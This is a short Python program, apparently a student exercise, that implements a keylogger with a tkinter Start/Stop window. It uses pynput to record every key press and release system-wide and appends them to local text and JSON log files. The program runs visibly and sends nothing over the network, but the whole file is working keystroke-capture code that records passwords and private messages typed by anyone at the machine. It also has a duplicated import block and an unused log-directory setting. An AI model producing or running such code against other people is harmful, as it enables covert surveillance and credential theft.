import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

keys_used = []

# Specify the directory where you want to save the files
LOG_DIRECTORY = "C:/Users/navir/OneDrive/Desktop/Naan Mudhalvan"

import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

keys_used = []

def generate_text_log(keys):
    try:
        with open('key_log.txt', "a+") as keys_file:
            keys_file.write(keys + "\n")
    except Exception as e:
        print("Error writing to key_log.txt:", e)

def generate_json_file(keys_used):
    try:
        with open('key_log.json', 'a+') as key_log:
            json.dump(keys_used, key_log)
            key_log.write("\n")
    except Exception as e:
        print("Error writing to key_log.json:", e)

def on_press(key):
    keys_used.append({'Pressed': f'{key}'})

def on_release(key):
    keys_used.append({'Released': f'{key}'})
    generate_json_file(keys_used)
    generate_text_log(str(keys_used))
    keys_used.clear()

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'key_log.txt'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')

root = Tk()
root.title("Keylogger")

label = Label(root, text='Click "Start" to begin keylogging.')
label.config(anchor=CENTER)
label.pack()

start_button = Button(root, text="Start", command=start_keylogger)
start_button.pack(side=LEFT)

stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled')
stop_button.pack(side=RIGHT)

root.geometry("250x250")

root.mainloop()
